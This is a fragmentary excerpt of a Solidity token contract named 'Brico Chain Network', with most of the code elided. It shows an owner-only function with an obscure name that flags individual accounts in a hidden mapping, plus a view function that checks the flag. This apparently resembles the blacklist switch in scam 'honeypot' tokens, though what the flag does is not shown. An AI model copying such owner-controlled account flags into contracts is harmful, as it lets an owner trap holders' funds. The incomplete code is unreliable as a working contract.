...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Brico Chain Network';
    ...
    function ElipseBrico(address account) public onlyOwner {
        _anyplace[account] = true;
    }

    function BricoStatsEarn(address account) public view returns (bool) {
...
contract BricoChainNetwork is BaseToken {
